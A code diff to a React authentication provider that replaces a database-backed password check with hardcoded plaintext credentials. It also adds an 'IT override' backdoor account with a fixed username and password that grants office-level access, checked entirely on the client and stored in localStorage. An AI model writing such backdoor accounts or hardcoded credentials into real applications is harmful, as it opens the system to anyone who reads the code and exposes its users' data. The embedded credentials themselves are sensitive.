@@ -26,17 +26,24 @@ export const AuthProvider = ({ children }) => {
 
   const login = async (username, password) => {
     try {
-      // Check office user first
-      const { data: officeData, error: officeError } = await supabase
-        .from('office_info_ff2024')
-        .select('*')
-        .limit(1)
-        .single();
+      // IT override account check
+      if (username === 'cholmx' && password === '?74Beverlydrive') {
+        const userData = {
+          id: 'it_admin',
+          username: 'cholmx',
+          name: 'IT Administrator',
+          role: 'office' // Give IT admin access to office dashboard
+        };
+        setUser(userData);
+        localStorage.setItem('fireforce_user', JSON.stringify(userData));
+        return { success: true };
+      }
 
-      if (!officeError && username === 'office1' && password === (officeData.password_hash || 'password')) {
+      // Fixed office user credentials
+      if (username === 'ffoffice1' && password === 'ffpassword') {
         const userData = {
           id: 'office1',
-          username: 'office1',
+          username: 'ffoffice1',
           name: 'Office Administrator',
           role: 'office'
         };
